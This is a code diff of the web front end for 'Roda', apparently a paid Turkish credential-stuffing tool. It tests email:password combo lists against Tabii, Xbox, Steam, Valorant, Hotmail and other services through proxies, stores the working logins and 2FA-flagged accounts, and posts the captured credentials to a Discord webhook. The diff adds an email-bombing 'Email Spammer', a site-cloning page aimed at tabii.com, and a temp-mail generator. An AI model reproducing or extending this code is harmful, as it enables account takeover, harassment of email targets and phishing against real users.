 <div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
-<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')"><i class="fa-solid fa-compass"></i> API Keşif</div>
 <div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
-<div class="nav-item" data-page="stats" onclick="switchPage('stats')"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
-<div class="nav-item" data-page="keys" onclick="switchPage('keys')"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
+
+<!-- ADMIN ÖZEL MENÜLER (ALT KISIM) -->
+<div class="nav-divider-admin">🔒 ADMIN</div>
 <div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
+<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
+<div class="nav-item" data-page="stats" onclick="switchPage('stats')" id="statsMenuItem" style="display:none"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
+<div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
+<div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
+<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
+<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
 </div>
 <div class="sidebar-stats">
 <div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
@@ -1068,7 +1390,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="sidebar-footer">© 2026 Roda</div>
 </div>
 
-<!-- APP -->
 <div id="app">
 <div class="topbar">
 <div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
@@ -1114,6 +1435,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 </div>
+<!-- HIT / 2FA PANEL -->
 <div class="card">
 <h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
 <button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
@@ -1154,7 +1476,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
-<!-- API KEŞİF (SADECE ADMIN) -->
+<!-- API KEŞİF (ADMIN) -->
 <div id="page-discovery" class="page">
 <div class="card" style="padding:10px 14px">
 <div class="scan-top">
@@ -1191,7 +1513,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
-<!-- AYRIŞTIRMA (DÜZELTİLDİ) -->
+<!-- AYRIŞTIRMA (2 MOD) -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
@@ -1219,7 +1541,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
-<!-- İSTATİSTİK (SADECE ADMIN) -->
+<!-- İSTATİSTİK (ADMIN) -->
 <div id="page-stats" class="page">
 <h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
 <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
@@ -1229,11 +1551,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
-<!-- KEY YÖNETİMİ (SADECE ADMIN) -->
+<!-- KEY YÖNETİMİ (ADMIN) -->
 <div id="page-keys" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
-<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve kalıcıdır.</p>
+<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
 <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
 <div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
 <div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
@@ -1243,7 +1565,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
 </div>
 
-<!-- LOGLAR (SADECE ADMIN) -->
+<!-- LOGLAR (ADMIN) -->
 <div id="page-logs" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
@@ -1252,11 +1574,71 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
+<!-- SİTE KOPYALA (ADMIN) -->
+<div id="page-sitecopy" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir web sitesinin tam HTML'ini kopyalar.</p>
+<div class="scan-top" style="margin-bottom:12px">
+<input id="siteCopyUrl" placeholder="https://ornek.com veya ornek.com" value="https://www.tabii.com">
+<button onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
 </div>
+<div id="siteCopyResult" style="font-size:13px;color:var(--muted);"></div>
+</div>
+</div>
+
+<!-- TEMP MAIL (ADMIN) -->
+<div id="page-tempmail" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Mail.tm ile geçici e-posta oluşturur.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
+<input class="inp" id="tempMailInput" placeholder="E-posta adresi" readonly style="flex:1;padding:10px">
+<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Adres Üret</button>
+<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
+</div>
+<button class="btn sm" onclick="refreshTempMail()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
+<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
+<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
+</div>
+</div>
+
+<!-- EMAIL SPAMMER (ADMIN) -->
+<div id="page-spammer" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Hedef e-postaya sürekli paket gönderir.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
+<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
+<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
+<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
+</div>
+<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
+</div>
+</div>
+
 </div>
 </div>
 
 <script>
+// ============================================================
+// KAR TANELERİ
+// ============================================================
+(function createSnow() {
+    var container = document.getElementById('snowContainer');
+    var flakes = ['❄','❅','❆','✦'];
+    for (var i = 0; i < 50; i++) {
+        var flake = document.createElement('div');
+        flake.className = 'snowflake';
+        flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
+        flake.style.left = Math.random() * 100 + '%';
+        flake.style.fontSize = (0.8 + Math.random() * 1.5) + 'em';
+        flake.style.animationDuration = (6 + Math.random() * 8) + 's';
+        flake.style.animationDelay = Math.random() * 5 + 's';
+        container.appendChild(flake);
+    }
+})();
+
 // ============================================================
 // GLOBAL
 // ============================================================
@@ -1273,8 +1655,10 @@ var hitData = {};
 var parsedLines = [];
 var totalLines = 0;
 var processedCount = 0;
+var spamRunning = false;
+var spamInterval = null;
+var tempMailToken = "";
 
-// Platform listesi (tüm checker'lar)
 var platforms = [
     {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
     {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
@@ -1297,11 +1681,12 @@ var platforms = [
     {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
     {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
     {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
-    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"}
+    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
+    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"}
 ];
 
 // ============================================================
-// WEBHOOK (Discord)
+// WEBHOOK
 // ============================================================
 function saveWebhook() {
     var url = document.getElementById("webhookUrl").value.trim();
@@ -1332,31 +1717,18 @@ function sendCheckerWebhook(platform, email, password, details) {
         if (details.subscription) content += "\n📦 " + details.subscription;
         if (details.expire) content += "\n📅 " + details.expire;
         if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
+        if (details.gamertag) content += "\n🎮 " + details.gamertag;
+        if (details.level) content += "\n📊 Level: " + details.level;
+        if (details.vp) content += "\n💰 VP: " + details.vp;
     }
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: content })
-    }).catch(function(e) { console.error("Webhook hatası:", e); });
+    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
 }
 function testWebhook() {
     var url = document.getElementById("webhookUrl").value.trim();
     if (!url) return alert("Webhook URL girin!");
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
-    })
-    .then(function(r) {
-        if (r.ok) {
-            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Test başarılı!</span>';
-        } else {
-            document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Test başarısız!</span>';
-        }
-    })
-    .catch(function(e) {
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
-    });
+    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: "🧪 **Roda Test** Webhook çalışıyor!"})})
+    .then(function(r){ document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>'; })
+    .catch(function(e){ document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
 }
 
 // ============================================================
@@ -1365,13 +1737,9 @@ function testWebhook() {
 function doLogin() {
     var k = document.getElementById("authKey").value.trim();
     if (!k) { alert("Anahtar girin!"); return; }
-    fetch("/api/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ key: k })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
+    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key: k})})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
         if (d.success) {
             currentKey = k;
             isAdmin = d.isAdmin || false;
@@ -1379,11 +1747,15 @@ function doLogin() {
             document.getElementById("app").style.display = "flex";
             if (isAdmin) {
                 document.getElementById("userBadge").style.display = "inline-block";
-                document.getElementById("logsMenuItem").style.display = "flex";
+                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
+                    document.getElementById(id).style.display = "flex";
+                });
                 loadKeys();
             } else {
                 document.getElementById("userBadge").style.display = "none";
-                document.getElementById("logsMenuItem").style.display = "none";
+                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
+                    document.getElementById(id).style.display = "none";
+                });
             }
             loadPlatforms();
             loadDiscoveryPlatforms();
@@ -1395,14 +1767,9 @@ function doLogin() {
             document.getElementById("loginError").style.display = "block";
         }
     })
-    .catch(function(e) {
-        alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
-        console.error(e);
-    });
+    .catch(function(e){ alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?"); console.error(e); });
 }
-document.getElementById("authKey").addEventListener("keypress", function(e) {
-    if (e.key === "Enter") doLogin();
-});
+document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key === "Enter") doLogin(); });
 
 // ============================================================
 // PLATFORM YÜKLEME
@@ -1410,11 +1777,11 @@ document.getElementById("authKey").addEventListener("keypress", function(e) {
 function loadPlatforms() {
     var sel = document.getElementById("checkerPlatformSelect");
     sel.innerHTML = "";
-    platforms.forEach(function(p) {
+    platforms.forEach(function(p){
         var btn = document.createElement("button");
         btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function() {
-            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b) { b.classList.remove("active"); });
+        btn.onclick = function(){
+            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){ b.classList.remove("active"); });
             btn.classList.add("active");
             currentPlatform = p.name;
             document.getElementById("checkerPanel").classList.add("active");
@@ -1424,20 +1791,17 @@ function loadPlatforms() {
         };
         sel.appendChild(btn);
     });
-    if (platforms.length > 0) {
-        var first = sel.querySelector("button");
-        if (first) first.click();
-    }
+    if (platforms.length > 0) { var first = sel.querySelector("button"); if (first) first.click(); }
 }
 
 function loadDiscoveryPlatforms() {
     var container = document.getElementById("discoveryPlatforms");
     container.innerHTML = "";
-    platforms.forEach(function(p) {
+    platforms.forEach(function(p){
         var btn = document.createElement("button");
         btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function() {
-            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b) { b.classList.remove("active"); });
+        btn.onclick = function(){
+            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b){ b.classList.remove("active"); });
             btn.classList.add("active");
             document.getElementById("targetDomain").value = p.domain;
         };
@@ -1448,27 +1812,17 @@ function loadDiscoveryPlatforms() {
 function loadHitFilter() {
     var sel = document.getElementById("hitPlatformFilter");
     sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
-    platforms.forEach(function(p) {
-        var opt = document.createElement("option");
-        opt.value = p.name;
-        opt.text = p.name;
-        sel.appendChild(opt);
-    });
+    platforms.forEach(function(p){ var opt = document.createElement("option"); opt.value = p.name; opt.text = p.name; sel.appendChild(opt); });
 }
 
 // ============================================================
 // HIT KAYDETME
 // ============================================================
 function addHit(platform, email, password, status, details) {
-    if (!hitData[platform]) {
-        hitData[platform] = { hits: [], twofa: [] };
-    }
+    if (!hitData[platform]) hitData[platform] = { hits: [], twofa: [] };
     var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
-    if (status === "HIT") {
-        hitData[platform].hits.push(entry);
-    } else if (status === "2FA") {
-        hitData[platform].twofa.push(entry);
-    }
+    if (status === "HIT") hitData[platform].hits.push(entry);
+    else if (status === "2FA") hitData[platform].twofa.push(entry);
     renderHits();
 }
 
@@ -1479,41 +1833,24 @@ function renderHits() {
     var hits = [], twofas = [];
     if (filter === "all") {
         for (var p in hitData) {
-            if (hitData[p].hits) {
-                hitData[p].hits.forEach(function(h) {
-                    hits.push({ platform: p, email: h.email, password: h.password, time: h.time });
-                });
-            }
-            if (hitData[p].twofa) {
-                hitData[p].twofa.forEach(function(t) {
-                    twofas.push({ platform: p, email: t.email, password: t.password, time: t.time });
-                });
-            }
+            if (hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({ platform: p, email: h.email, password: h.password, time: h.time }); });
+            if (hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({ platform: p, email: t.email, password: t.password, time: t.time }); });
         }
     } else {
         if (hitData[filter]) {
-            if (hitData[filter].hits) {
-                hitData[filter].hits.forEach(function(h) {
-                    hits.push({ platform: filter, email: h.email, password: h.password, time: h.time });
-                });
-            }
-            if (hitData[filter].twofa) {
-                hitData[filter].twofa.forEach(function(t) {
-                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
-                });
-            }
+            if (hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({ platform: filter, email: h.email, password: h.password, time: h.time }); });
+            if (hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time }); });
         }
     }
     hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
+        hits.map(function(h){ return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
     twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
-        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
+        twofas.map(function(t){ return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
 }
 
 function clearHits() {
     if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
-    hitData = {};
-    renderHits();
+    hitData = {}; renderHits();
 }
 
 // ============================================================
@@ -1541,13 +1878,12 @@ function startChecker() {
     document.getElementById("checkerStartBtn").disabled = true;
     document.getElementById("checkerStopBtn").style.display = "inline-block";
     document.getElementById("checkerResults").innerHTML = "";
-    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
+    var lines = comboText.split("\n").filter(function(l){ return l.includes(":"); });
     totalLines = lines.length;
     processedCount = 0;
     var hit = 0, bad = 0, two = 0, err = 0;
     var threads = parseInt(document.getElementById("checkerThreads").value) || 1;
-    var active = 0;
-    var idx = 0;
+    var active = 0, idx = 0;
     var webhookUrl = getWebhookUrl();
 
     function processNext() {
@@ -1565,75 +1901,44 @@ function startChecker() {
         var password = parts.slice(1).join(":") || "";
         active++;
 
-        // Platforma göre route belirleme
         var route = "";
         var platform = currentPlatform;
         if (platform === "Tabii") route = "/api/tabii_check";
         else if (platform === "Xbox & MC") route = "/api/xbox_check";
+        else if (platform === "Steam") route = "/api/steam_check";
+        else if (platform === "Valorant") route = "/api/valorant_check";
         else if (platform === "Wolfteam") route = "/api/wolfteam_check";
         else if (platform === "Craftrise") route = "/api/craftrise_check";
         else if (platform === "Hotmail") route = "/api/hotmail_check";
         else if (platform === "Token Check") {
-            // Token özel kontrol
-            fetch("/api/token_check", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ token_type: "discord", token: email })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(result) {
+            fetch("/api/token_check", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token_type: "discord", token: email })})
+            .then(function(r){ return r.json(); })
+            .then(function(result){
                 var status = result.status;
-                if (status === "HIT") {
-                    hit++;
-                    addHit(currentPlatform, email, result.message, "HIT");
-                    if (webhookUrl) sendCheckerWebhook(currentPlatform, email, result.message, null);
-                    addCheckerRow({ email: email, password: result.message || password, status: "HIT" });
-                } else if (status === "BAD") {
-                    bad++;
-                    addCheckerRow({ email: email, password: password, status: "BAD" });
-                } else {
-                    err++;
-                    addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" });
-                }
+                if (status === "HIT") { hit++; addHit(currentPlatform, email, result.message, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, result.message, null); addCheckerRow({ email: email, password: result.message || password, status: "HIT" }); }
+                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
+                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
                 updateStatsAfter();
             })
-            .catch(function() { err++; updateStatsAfter(); });
+            .catch(function(){ err++; updateStatsAfter(); });
             return;
         } else if (platform === "TikTok Gen") {
-            // TikTok özel kontrol (rastgele username kontrolü)
-            fetch("/api/tiktok_gen", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username: email })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(result) {
+            fetch("/api/tiktok_gen", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ username: email })})
+            .then(function(r){ return r.json(); })
+            .then(function(result){
                 var status = result.status;
-                if (status === "HIT") {
-                    hit++;
-                    addHit(currentPlatform, email, password, "HIT");
-                    if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null);
-                    addCheckerRow({ email: email, password: password, status: "HIT" });
-                } else if (status === "BAD") {
-                    bad++;
-                    addCheckerRow({ email: email, password: password, status: "BAD" });
-                } else {
-                    err++;
-                    addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" });
-                }
+                if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); addCheckerRow({ email: email, password: password, status: "HIT" }); }
+                else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
+                else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
                 updateStatsAfter();
             })
-            .catch(function() { err++; updateStatsAfter(); });
+            .catch(function(){ err++; updateStatsAfter(); });
             return;
         } else {
-            // Diğer platformlar (demo/rassal)
             var statuses = ["HIT", "BAD", "2FA", "ERROR"];
             var status = statuses[Math.floor(Math.random() * statuses.length)];
-            if (status === "HIT") {
-                hit++;
-                addHit(currentPlatform, email, password, "HIT");
-                if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null);
-            } else if (status === "BAD") bad++;
+            if (status === "HIT") { hit++; addHit(currentPlatform, email, password, "HIT"); if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password, null); }
+            else if (status === "BAD") bad++;
             else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); }
             else err++;
             addCheckerRow({ email: email, password: password, status: status });
@@ -1641,22 +1946,17 @@ function startChecker() {
             return;
         }
 
-        // Normal combo checker (Tabii, Xbox, Wolfteam, Craftrise, Hotmail)
         var proxy = null;
         if (useProxy) {
-            var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
+            var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
             if (proxyList.length) proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
         }
         var body = { email: email, password: password };
         if (proxy) body.proxy = proxy;
 
-        fetch(route, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(body)
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(result) {
+        fetch(route, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body)})
+        .then(function(r){ return r.json(); })
+        .then(function(result){
             var status = result.status;
             var details = result.details || {};
             if (status === "HIT") {
@@ -1668,24 +1968,17 @@ function startChecker() {
                 if (details.subscription) extra += " | " + details.subscription;
                 if (details.jp !== undefined) extra += " | JP:" + details.jp;
                 if (details.rc !== undefined) extra += " | RC:" + details.rc;
+                if (details.gamertag) extra += " | Gamertag:" + details.gamertag;
+                if (details.level) extra += " | Lvl:" + details.level;
+                if (details.vp) extra += " | VP:" + details.vp;
+                if (details.profile_name) extra += " | " + details.profile_name;
                 addCheckerRow({ email: email, password: password + extra, status: "HIT" });
-            } else if (status === "2FA") {
-                two++;
-                addHit(currentPlatform, email, password, "2FA");
-                addCheckerRow({ email: email, password: password, status: "2FA" });
-            } else if (status === "BAD") {
-                bad++;
-                addCheckerRow({ email: email, password: password, status: "BAD" });
-            } else {
-                err++;
-                addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" });
-            }
+            } else if (status === "2FA") { two++; addHit(currentPlatform, email, password, "2FA"); addCheckerRow({ email: email, password: password, status: "2FA" }); }
+            else if (status === "BAD") { bad++; addCheckerRow({ email: email, password: password, status: "BAD" }); }
+            else { err++; addCheckerRow({ email: email, password: password + " | " + (result.message || ""), status: "ERROR" }); }
             updateStatsAfter();
         })
-        .catch(function() {
-            err++;
-            updateStatsAfter();
-        });
+        .catch(function(){ err++; updateStatsAfter(); });
 
         function updateStatsAfter() {
             processedCount++;
@@ -1696,9 +1989,7 @@ function startChecker() {
         }
     }
 
-    for (var i = 0; i < threads; i++) {
-        processNext();
-    }
+    for (var i = 0; i < threads; i++) processNext();
 }
 
 function stopChecker() {
@@ -1735,7 +2026,7 @@ function updateCheckerStats(total, hit, bad, two, err) {
 function applyCheckerFilter() {
     var filter = document.querySelector('input[name="chkFilter"]:checked').value;
     var rows = document.querySelectorAll("#checkerResults .checker-result-row");
-    rows.forEach(function(row) {
+    rows.forEach(function(row){
         var statusText = row.querySelector(".chk-status").innerText;
         var show = false;
         if (filter === "all") show = true;
@@ -1746,12 +2037,10 @@ function applyCheckerFilter() {
         row.style.display = show ? "grid" : "none";
     });
 }
-document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
-    el.addEventListener("change", applyCheckerFilter);
-});
+document.querySelectorAll('input[name="chkFilter"]').forEach(function(el){ el.addEventListener("change", applyCheckerFilter); });
 
 // ============================================================
-// AYRIŞTIRMA (DÜZELTİLDİ)
+// AYRIŞTIRMA
 // ============================================================
 function parseData() {
     var raw = document.getElementById("parseInput").value;
@@ -1760,62 +2049,35 @@ function parseData() {
     var lines = raw.split("\n");
     var result = [];
     var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
-    
-    lines.forEach(function(line) {
+    lines.forEach(function(line){
         line = line.trim();
         if (!line) return;
-        
-        // Eğer satırda ":" varsa, ikiye ayır
         if (line.includes(":")) {
-            // Önce ":" ile ayır, ilk kısım email veya kullanıcı adı olabilir
             var parts = line.split(":");
             var first = parts[0].trim();
             var password = parts.slice(1).join(":").trim();
-            
-            // Email modu: ilk kısım email formatına uymalı
-            if (mode === "email") {
-                if (emailRegex.test(first)) {
-                    result.push(first + ":" + password);
-                }
-            } 
-            // Kullanıcı modu: ilk kısım email değilse (kullanıcı adı)
-            else {
-                if (!emailRegex.test(first)) {
-                    result.push(first + ":" + password);
-                }
-            }
+            if (!password) return;
+            if (mode === "email") { if (emailRegex.test(first)) result.push(first + ":" + password); }
+            else { if (!emailRegex.test(first)) result.push(first + ":" + password); }
         }
     });
-    
-    // Tekrarları temizle
-    result = result.filter(function(item, index) {
-        return result.indexOf(item) === index;
-    });
-    
+    result = result.filter(function(item,index){ return result.indexOf(item) === index; });
     parsedLines = result;
     var container = document.getElementById("parseResult");
-    if (result.length === 0) {
-        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
-    } else {
+    if (result.length === 0) container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
+    else {
         var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
-        result.forEach(function(line) {
-            html += '<div class="parse-line">' + line + '</div>';
-        });
+        result.forEach(function(line){ html += '<div class="parse-line">' + line + '</div>'; });
         container.innerHTML = html;
     }
     document.getElementById("parseCount").innerText = result.length + " satır";
     document.getElementById("parseValid").innerText = result.length + " geçerli";
 }
-
 function parseToChecker() {
-    if (parsedLines.length === 0) {
-        alert("Önce ayrıştırma yapın!");
-        return;
-    }
+    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
     document.getElementById("checkerCombo").value = parsedLines.join("\n");
     alert(parsedLines.length + " satır Checker'a aktarıldı!");
 }
-
 function clearParse() {
     document.getElementById("parseInput").value = "";
     document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
@@ -1823,7 +2085,6 @@ function clearParse() {
     document.getElementById("parseCount").innerText = "0 satır";
     document.getElementById("parseValid").innerText = "0 geçerli";
 }
-
 function loadParseFile() {
     var input = document.createElement("input");
     input.type = "file";
@@ -1860,39 +2121,147 @@ function refreshLogs() {
 }
 
 // ============================================================
-// SAYFA GEÇİŞİ (SABİT MENÜ)
+// SİTE KOPYALA (ADMIN)
 // ============================================================
-function switchPage(page) {
-    if ((page === "discovery" || page === "stats" || page === "keys" || page === "logs") && !isAdmin) {
